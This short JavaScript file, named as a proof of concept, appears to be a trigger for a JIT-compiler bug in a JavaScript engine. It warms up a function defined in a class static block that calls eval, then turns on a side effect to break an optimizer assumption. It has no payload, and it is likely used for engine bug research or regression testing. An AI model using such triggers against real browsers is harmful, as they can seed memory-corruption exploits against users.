let f;
let some_global;
let do_side_effect = false;

function poc() {
    class C {
        static {
            f = () => {
                eval('');
                if (do_side_effect) {
                    some_global = {};
                }
                return [1.1];
            };
        }
    }
    f();
}

for (let i = 0; i < 25000; i++) {
    poc();
}

do_side_effect = true;
poc();